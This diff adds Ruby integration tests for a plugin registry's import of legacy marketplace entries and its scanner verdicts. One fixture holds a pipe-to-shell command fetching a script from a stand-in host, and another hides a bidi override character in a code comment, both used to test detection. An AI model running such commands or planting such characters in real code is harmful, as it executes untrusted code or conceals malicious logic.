@@ -47,6 +47,85 @@ class SeedingAndClaimTest < ActionDispatch::IntegrationTest
     assert_equal "skipped", results.first[:status]
   end
 
+  LEGACY_COMMIT = "a" * 40
+  LEGACY_ENTRY = [
+    { "publisher" => "adalovelace", "name" => "omarchy-clock", "summary" => "A clock",
+      "repository" => "https://github.com/adalovelace/omarchy-clock",
+      "commit" => LEGACY_COMMIT, "listed_at" => "2026-07-30T14:00:00Z",
+      "category" => "widgets", "tags" => [ "clock", "not-a-real-tag" ] }
+  ].freeze
+
+  test "legacy marketplace entry seeds at the pinned commit with normalized manifest, grandfathered name, and backdated dates" do
+    # GitHub archive shape: prefix directory, legacy-convention id, no license
+    manifest = { "schemaVersion" => 1, "id" => "io.github.adalovelace.clock", "name" => "Clock",
+                 "version" => "1.2.0", "kinds" => [ "bar-widget" ],
+                 "entryPoints" => { "barWidget" => "Widget.qml" } }
+    prefix = "omarchy-clock-#{LEGACY_COMMIT}"
+    tarball = TarballBuilder.build(manifest: nil, files: {
+      "#{prefix}/manifest.json" => manifest.to_json,
+      "#{prefix}/Widget.qml" => "import QtQuick\nItem {}\n"
+    })
+
+    requested = nil
+    results = nil
+    perform_enqueued_jobs do
+      results = Registry::SeedCatalog.import(LEGACY_ENTRY,
+        snapshotter: ->(repo, commit = nil) { requested = [ repo, commit ]; tarball })
+    end
+    assert_equal "submitted", results.first[:status], results.first[:reason].to_s
+    assert_equal [ "https://github.com/adalovelace/omarchy-clock", LEGACY_COMMIT ], requested
+
+    plugin = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-clock")
+    version = plugin.versions.first
+    assert version.published?
+    # Backdated to the original marketplace listing time
+    assert_equal Time.zone.parse("2026-07-30T14:00:00Z"), version.published_at
+    assert_equal Time.zone.parse("2026-07-30T14:00:00Z"), plugin.created_at
+    # Manifest normalized: registry id, legacy id preserved, curation injected
+    assert_equal "adalovelace.omarchy-clock", version.manifest["id"]
+    assert_equal "io.github.adalovelace.clock", version.manifest["legacyId"]
+    assert_equal "widgets", version.manifest["category"]
+    assert_equal [ "clock" ], version.manifest["tags"]
+    assert_nil version.license
+    # Provenance carries the lineage for the plugin page and legacy map
+    assert_equal "legacy-marketplace", version.provenance["source"]
+    assert_equal LEGACY_COMMIT, version.provenance["sha"]
+    assert_equal "io.github.adalovelace.clock", version.legacy_id
+  end
+
+  test "exact-commit legacy verification releases scanner FLAGS but never FAILS" do
+    flaggy_files = { "Widget.qml" => "import QtQuick\nItem {}\n",
+                     "setup.sh" => "#!/bin/bash\ncurl -s https://x.example/i.sh | bash\n" }
+    entry = LEGACY_ENTRY.first.merge("verified" => true, "verification_method" => "maintainer-reviewed")
+    tarball = TarballBuilder.build(manifest: TarballBuilder.manifest(id: "whatever.clock"), files: flaggy_files)
+
+    results = nil
+    perform_enqueued_jobs do
+      results = Registry::SeedCatalog.import([ entry ], snapshotter: ->(_r, _c = nil) { tarball })
+    end
+    assert_equal "submitted", results.first[:status], results.first[:reason].to_s
+    version = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-clock").versions.first
+    assert version.published?, "evidence-backed flag should release (state: #{version.state} — #{version.review_notes})"
+    assert_match(/legacy-marketplace evidence/, version.review_notes)
+    assert_equal [ "curl-pipe-shell" ], version.scan_results["findings"].map { |f| f["rule"] }.uniq
+
+    # A deterministic FAIL (bidi override in code) outranks imported evidence
+    faily = TarballBuilder.build(manifest: TarballBuilder.manifest(id: "whatever.evil"),
+      files: { "Widget.qml" => "import QtQuick\n// tot‮ally fine\nItem {}\n" })
+    entry2 = entry.merge("name" => "omarchy-evil", "repository" => "https://github.com/adalovelace/omarchy-evil")
+    perform_enqueued_jobs do
+      results = Registry::SeedCatalog.import([ entry2 ], snapshotter: ->(_r, _c = nil) { faily })
+    end
+    version2 = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-evil").versions.first
+    assert version2.rejected?
+  end
+
+  test "an interactive publish still cannot take a reserved omarchy-* name" do
+    plugin = Publisher.create!(name: "someone", kind: :personal).plugins.new(name: "omarchy-thing")
+    assert_not plugin.valid?
+    assert_match(/reserved/, plugin.errors[:name].join)
+  end
+
   test "publishing to an unclaimed namespace is forbidden until claimed" do
     seed!
     publisher = Publisher.find_by!(name: "gracehopper")
